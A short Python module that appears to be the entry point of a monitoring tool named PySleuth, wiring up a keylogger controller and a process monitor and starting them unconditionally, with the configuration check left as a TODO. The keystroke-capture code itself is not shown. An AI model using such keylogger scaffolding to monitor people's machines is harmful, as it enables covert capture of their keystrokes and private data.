from .controllers import KeyLoggerController
from .controllers import ProcessController

from .config_handler import loadConfig

class PySleuth:
    def __init__(self):
        self._controllers = set()

        self._initComponents()

    def start(self):
        for controller in self._controllers:
            controller.startWorker()

    def mainLoop(self):
        try:
            while True:
                pass
        except KeyboardInterrupt:
            print("\nUser abort!")

    def _initComponents(self):
        # TODO: Take from configuration file
        if True:
            self._initKeylogger()

        if True:
            self._initProcessMonitor()

    def _initKeylogger(self):
        self._controllers.add(KeyLoggerController())

    def _initProcessMonitor(self):
        self._controllers.add(ProcessController())
